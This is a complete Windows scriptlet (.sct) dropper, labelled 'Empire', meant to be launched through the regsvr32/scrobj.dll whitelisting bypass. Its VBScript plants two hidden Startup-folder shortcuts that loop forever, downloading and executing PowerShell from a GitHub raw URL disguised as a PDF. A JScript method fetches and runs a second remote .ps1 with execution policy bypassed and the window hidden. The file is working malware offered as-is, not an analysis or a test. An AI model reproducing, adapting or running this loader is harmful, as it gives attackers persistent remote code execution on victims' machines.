<?XML version="1.0"?>
<scriptlet>

<registration
    description="Empire"
    progid="Empire"
    version="1.00"
    classid="{20001111-0000-0000-0000-0000FEEDACDC}"
	>
	<!-- regsvr32 /s /i"C:\Bypass\o_MsgBox.sct" scrobj.dll -->
	<!-- regsvr32 /s /i:http://server/o_MsgBox.sct scrobj.dll -->
	<!-- That should work over a proxy and SSL/TLS... -->
	<!-- Credits Of Concept - al -murtadin  -->
	<script language="VBScript">
		<![CDATA[
		
set WshShell = CreateObject("WScript.Shell")
strDesktop = WshShell.SpecialFolders("Programs")
set oShellLink = WshShell.CreateShortcut(strDesktop & "\Startup\amel.lnk")
oShellLink.TargetPath = "cmd.exe"
oShellLink.WindowStyle = 7
oShellLink.Arguments = "/c powershell -ExecutionPolicy b -w hidden -noexit -C for(;;){try{IEX((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/riyantigomez/gomez22/master/n4.pdf'))}catch{}Start-Sleep 30}"
oShellLink.Save

set WshShell = CreateObject("WScript.Shell")
strDesktop = WshShell.SpecialFolders("Programs")
set oShellLink = WshShell.CreateShortcut(strDesktop & "\Startup\amel2.lnk")
oShellLink.TargetPath = "cmd.exe"
oShellLink.WindowStyle = 7
oShellLink.Arguments = "/c powershell -ExecutionPolicy b -w hidden -noexit -C for(;;){try{IEX((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/riyantigomez/gomez22/master/n4.pdf'))}catch{}Start-Sleep 30}"
oShellLink.Save
    
		]]>
</script>
</registration>

<public>
    <method name="Exec"></method>
</public>
<script language="JScript">
<![CDATA[
	
	function Exec()
	{

    w = new ActiveXObject("WScript.Shell");
		h = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
		h.Open("GET","https://raw.githubusercontent.com/riyantigomez/gomez22/master/00.ps1",false);
		h.Send();
		c = h.ResponseText;
		ps = 'powershell.exe -ExecutionPolicy Bypass -windowstyle hidden -Command ';
		r = new ActiveXObject("WScript.Shell").Exec(ps + c);
   
   
	}
	
]]>
</script>

</scriptlet>
